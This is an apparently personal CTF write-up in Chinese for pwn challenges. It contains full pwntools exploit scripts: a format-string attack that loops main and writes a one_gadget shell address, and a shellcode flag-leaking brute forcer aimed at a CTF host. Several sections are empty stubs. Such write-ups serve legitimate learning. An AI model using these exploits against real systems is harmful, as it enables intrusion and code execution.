WP官号有，到时候看
# PWN
## master_of_rop
```python


```
## onlyone
非栈上格式化字符串漏洞，且只给了一次机会，想利用的话就得手动让其循环，方法就是改变printf的返回函数为main函数。
首先找到一个传递链来修改printf的返回函数
![[Pasted image 20250724162557.png]]
这里利用这里的传递链，先将+18的位置修改为指向返回地址，然后通过+f8的位置修改返回函数就可以让函数回到main开头
![[Pasted image 20250724162642.png]]
修改成功后就可以开始构造修改一个地址为ogg最后执行，
![[Pasted image 20250724163129.png]]
如这里我们找这一个链
![[Pasted image 20250724163202.png]]
接着一直循环修改这个位置为ogg即可
```python
from pwn import *
from wstube import websocket
import sys

context(arch='amd64', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './' + sys.argv[0][:-3]
libc_path = './libc-2.31.so'
if local:
    p = process(elf_path)
else:
    ip, port = ':'.split(':')
    p = remote(ip, port)
    # p = websocket("")

def debug():
    if local:
        gdb.attach(p, '''
            b main
            b *$rebase(0x8d7)
        ''')

elf = ELF(elf_path)
libc = ELF(libc_path)

p.recvuntil(b' is ')
stack = int(p.recv(14), 16) - 7
p.recvuntil(b' is ')
puts_addr = int(p.recv(14), 16)
log.info(f'stack: {hex(stack)}')
log.info(f'puts_addr: {hex(puts_addr)}')
libc_base = puts_addr - libc.symbols['puts']
ogg_list = [0xe3afe, 0xe3b01, 0xe3b04]
ogg = libc_base + ogg_list[1]
'''
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
'''
debug()
payload = '%c'*9 + f"%{(stack & 0xffff) - 0x8 - 9}c%hn%{0x112 + 6 - (stack & 0xff) + 0x2}c%39$hhn@%13$p"
p.sendline(payload.encode())
p.recvuntil(b'@')
code_base = int(p.recv(14), 16) - 0x80a
#p.recv()

def cal(A,B):
    return (A - B + 0x10000) % 0x10000

B = code_base + 0x812 # 循环起始位置

A = (stack + 0x18) & 0xffff
payload = f'%{A}c'.encode() + b'%27$hn'
payload += f'%{cal(B,A)}c'.encode() + b'%39$hn'
payload = payload.ljust(0x100, b'\x00')
p.send(payload)

A = ogg & 0xffff
payload = f'%{A}c'.encode() + b'%41$hn'
payload += f'%{cal(B,A)}c'.encode() + b'%39$hn'
payload = payload.ljust(0x100, b'\x00')
p.send(payload)

A = (stack + 0x18+2) & 0xffff
payload = f'%{A}c'.encode() + b'%27$hn'
payload += f'%{cal(B,A)}c'.encode() + b'%39$hn'
payload = payload.ljust(0x100, b'\x00')
p.send(payload)

A = (ogg>>16) & 0xffff
payload = f'%{A}c'.encode() + b'%41$hn'
payload += f'%{cal(B,A)}c'.encode() + b'%39$hn'
payload = payload.ljust(0x100, b'\x00')
p.send(payload)

A = (stack + 0x18+4) & 0xffff
payload = f'%{A}c'.encode() + b'%27$hn'
payload += f'%{cal(B,A)}c'.encode() + b'%39$hn'
payload = payload.ljust(0x100, b'\x00')
p.send(payload)

A = (ogg >> 32) & 0xffff
payload = f'%{A}c'.encode() + b'%41$hn'
payload += f'%{cal(B, A)}c'.encode() + b'%39$hn'
payload = payload.ljust(0x100, b'\x00')
p.send(payload)

magic = code_base+0x94E
payload = f'%{magic & 0xffff}c'.encode() + b'%39$hn'
payload = payload.ljust(0x100, b'\x00')
p.send(payload)



p.interactive()


```
## pwnpwn
```python

```
## shellcode
```python
from pwn import *
import sys

context(arch="amd64", os="linux", log_level="debug")
context.log_level = 'info'
elf_path = "./" + sys.argv[0][:-3]
libc_path = ""
local = True if len(sys.argv) == 1 else False

def debug():
    descript = '''
        b main
    '''
    if local:
        gdb.attach(p, descript)

def exp(dis, char):
    shellcode = asm('''
        add rsi, 0xe
        jmp rsi
    ''') + b'./flag\x00\x00'
    shellcode += asm(f'''
        mov r15, rsi
        add r15, 0x100
        mov rax, 2
        mov rdi, rsi
        sub rdi, 8
        xor rsi, rsi
        syscall

        mov rax, 0
        mov rdi, 3
        mov rsi, r15
        mov rdx, 0x100
        syscall

        add r15, {dis}
        mov dl, byte ptr[r15]
        mov cl, {char}
        cmp cl, dl
        jz loop
        mov rax, 60
        syscall

        loop:
        jmp loop
    ''')
    p.recvuntil(b'shellcode: \n')
    p.sendline(shellcode)

word = '-0123456789qwertyuiopasdfghjklzxcvbnm}{'
# NSSCTF{f80be998-f0df-4731-85
flag = 'NSSCTF{'
i = len(flag)
while not '}' in flag:
    print('--------'*10)
    for j in word:
        if local:
            p = process(elf_path)
        else:
            ip, port = "node9.anna.nssctf.cn:23623".split(":")
            p = remote(ip, port)
        try:
            log.info("now try: " + j)
            exp(i, ord(j))
            p.recvline(timeout=10)
            flag += j
            log.info("{} pos : {} success".format(i, j))
            i += 1
            log.info("flag: " + flag)
            with open("flag.txt", "w") as f:
                f.write(flag)
            pause()
            p.close()
            break
        except:
            log.info('error, try next')
            log.info('flag: ' + flag)
            p.close()

p.interactive()

```
## test_your_nc
nc题的绕过
命令绕过，有空总结一下
